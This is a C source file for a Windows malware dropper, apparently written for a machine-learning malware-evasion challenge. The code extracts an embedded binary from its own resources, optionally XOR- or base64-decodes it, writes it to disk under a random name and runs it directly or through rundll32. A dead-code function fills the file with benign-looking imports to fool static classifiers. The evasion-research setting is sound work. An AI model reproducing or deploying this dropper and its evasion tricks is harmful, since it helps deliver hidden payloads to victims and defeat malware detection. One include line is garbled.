// Drops and executes an Executable Binary from the PE Resources
// Created By Marcus Botacin for the MLSEC challenge
// Changelog: Created in 2019, updated in 2020 with obfuscation tricks

// Required Imports
#include<stdio.h>		// Debug Prints
#include<Windows.h>		// Resource Management
#include"resource.h"	// Resources Definition
#include<time.h>		// rand seed

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>>t.h>
#include<Uxtheme.h>
#include<atlstr.h>
#include<atlenc.h>

// Linking with teh dead imports
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "uxtheme.lib")

// Functions prototypes
void dead();
void drop(int size, void *buffer);
void* XOR(void *data, int size);
void* base64decode(void *data,DWORD *size);
void launch();
void set_name();

// Dropper Configurations
#define DEAD_IMPORTS
//#define XOR_ENCODE
#define XOR_KEY 0x73
//#define BASE64
#define RANDOM_NAME
#define NAME_SIZE 10
#define INJECT

// global: final binary name
char name[10*NAME_SIZE];

// Entry Point
int main()
{
	// Handle to myself
	HMODULE h = GetModuleHandle(NULL);
	// Locate Resource
	HRSRC r = FindResource(h,MAKEINTRESOURCE(IDR_BIN1),MAKEINTRESOURCE(BIN));
	// Load Resource
	HGLOBAL rc = LoadResource(h,r);
	// Ensure nobody else will handle it
	void* data = LockResource(rc);
	// Get embedded file size
	DWORD size = SizeofResource(h,r);
	// Obfuscation Procedures start here
#ifdef XOR_ENCODE
	data = XOR(data,size);
#endif
#ifdef BASE64
	data = base64decode(data,&size);
#endif
	// where to drop
	set_name();
	// Drop to Disk
	drop(size, data);
	// launch process
	launch();
#ifdef DEAD_CODE
	// dead code
	dead();
#endif
	// exit without waiting child process
	return 0;
}

void set_name()
{
#ifdef RANDOM_NAME
	int valid=0;
	srand(time(NULL));
	while(valid<NAME_SIZE)
	{
		char c = rand();
		if(c>='a' && c<='z')
		{
			name[valid++]=c;
		}
	}
#else
	strcpy(name,"proc");
#endif
#ifdef INJECT
	strcat(name,".dll");
#else
	strcat(name,".exe");
#endif
}

// Launch a New Process based on the dropped file name
void launch()
{
	STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi));
// build injection command
#ifdef INJECT
	char cmd[10*NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
	char args[10*NAME_SIZE];
	sprintf(args,"%s %s,#1",cmd,name);
	CreateProcessA(cmd,args,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi );
// call directly
#else
	CreateProcessA(name,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi );
#endif
}

// Decode a Base64 String
void* base64decode(void *data,DWORD *size)
{
	// original string size
	int original_size = strlen((char*)data);
	// number of bytes after decoded
	int decoded_size = Base64DecodeGetRequiredLength(original_size);
	// temporary buffer to store the decoded bytes
	void *buffer2 = malloc(decoded_size);
	// decoded
	Base64Decode((PCSTR)data,original_size,(BYTE*)buffer2,&decoded_size);
	// return new buffer size
	*size = decoded_size;
	// return new buffer
	return buffer2;
	// old buffer is lost (without freeing, sorry)
}

// XOR bytes in the buffer with a key
void* XOR(void *data, int size){
	// auxiliary buffer
	// this is never freed, but ok, i'm not a goodware anyway
	void *buffer = malloc(size);
	for(int i=0;i<size;i++)
	{
		((char*)buffer)[i] = ((char*)data)[i] ^ XOR_KEY;
	}
	return buffer;
}

// Drop buffer to file
void drop(int size, void *buffer)
{
	FILE *f = fopen(name,"wb");
    // traverse byte list
    for(int i=0;i<size;i++)
    {
		// byte pointer
        unsigned char c1 = ((char*)buffer)[i];
		// drop byte to file
        fprintf(f,"%c",c1);
    }
	// file fully written
    fclose(f);
}

// Dead Imports Function
void dead()
{
	return;
	memcpy(NULL,NULL,NULL);
	memset(NULL,NULL,NULL);
	strcpy(NULL,NULL);
	ShellAboutW(NULL,NULL,NULL,NULL);
	SHGetSpecialFolderPathW(NULL,NULL,NULL,NULL);
	ShellMessageBox(NULL,NULL,NULL,NULL,NULL);
	RegEnumKeyExW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegOpenKeyExW(NULL,NULL,NULL,NULL,NULL);
	RegEnumValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegGetValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegDeleteKeyW(NULL,NULL);
	RegQueryInfoKeyW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegQueryValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
	RegSetValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
	RegCloseKey(NULL);
	RegCreateKey(NULL,NULL,NULL);
	BSTR_UserFree(NULL,NULL);
	BufferedPaintClear(NULL,NULL);
	CoInitialize(NULL);
	CoUninitialize();
	CLSID x;
	CoCreateInstance(x,NULL,NULL,x,NULL);
	IsThemeActive();
	ImageList_Add(NULL,NULL,NULL);
	ImageList_Create(NULL,NULL,NULL,NULL,NULL);
	ImageList_Destroy(NULL);
	WideCharToMultiByte(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	lstrlenA(NULL);
	GetStartupInfoW(NULL);
	DeleteCriticalSection(NULL);
	LeaveCriticalSection(NULL);
	EnterCriticalSection(NULL);
	GetSystemTime(NULL);
	CreateEventW(NULL,NULL,NULL,NULL);
	CreateThread(NULL,NULL,NULL,NULL,NULL,NULL);
	ResetEvent(NULL);
	SetEvent(NULL);
	CloseHandle(NULL);
	GlobalSize(NULL);
	GlobalLock(NULL);
	GlobalUnlock(NULL);
	GlobalAlloc(NULL,NULL);
	lstrcmpW(NULL,NULL);
	MulDiv(NULL,NULL,NULL);
	GlobalFindAtomW(NULL);
	GetLastError();
	lstrlenW(NULL);
	CompareStringW(NULL,NULL,NULL,NULL,NULL,NULL);
	HeapDestroy(NULL);
	HeapReAlloc(NULL,NULL,NULL,NULL);
	HeapSize(NULL,NULL,NULL);
	SetBkColor(NULL,NULL);
	SetBkMode(NULL,NULL);
	EmptyClipboard();
	CreateDIBSection(NULL,NULL,NULL,NULL,NULL,NULL);
	GetStockObject(NULL);
	CreatePatternBrush(NULL);
	DeleteDC(NULL);
	EqualRgn(NULL,NULL);
	CombineRgn(NULL,NULL,NULL,NULL);
	SetRectRgn(NULL,NULL,NULL,NULL,NULL);
	CreateRectRgnIndirect(NULL);
	GetRgnBox(NULL,NULL);
	CreateRectRgn(NULL,NULL,NULL,NULL);
	CreateCompatibleBitmap(NULL,NULL,NULL);
	LineTo(NULL,NULL,NULL);
	MoveToEx(NULL,NULL,NULL,NULL);
	ExtCreatePen(NULL,NULL,NULL,NULL,NULL);
	GetObjectW(NULL,NULL,NULL);
	GetTextExtentPoint32W(NULL,NULL,NULL,NULL);
	GetTextMetricsW(NULL,NULL);
	CreateSolidBrush(NULL);
	SetTextColor(NULL,NULL);
	GetDeviceCaps(NULL,NULL);
	CreateCompatibleDC(NULL);
	CreateFontIndirectW(NULL);
	SelectObject(NULL,NULL);
	GetTextExtentPointW(NULL,NULL,NULL,NULL);
	RpcStringFreeW(NULL);
	UuidToStringW(NULL,NULL);
	UuidCreate(NULL);
	timeGetTime();
	SetBkColor(NULL,NULL);
	free(NULL);
	isspace(NULL);
	tolower(NULL);
	abort();
	isalnum(NULL);
	isdigit(NULL);
	isxdigit(NULL);
	toupper(NULL);
	malloc(NULL);
	free(NULL);
	memmove(NULL,NULL,NULL);
	isalpha(NULL);
}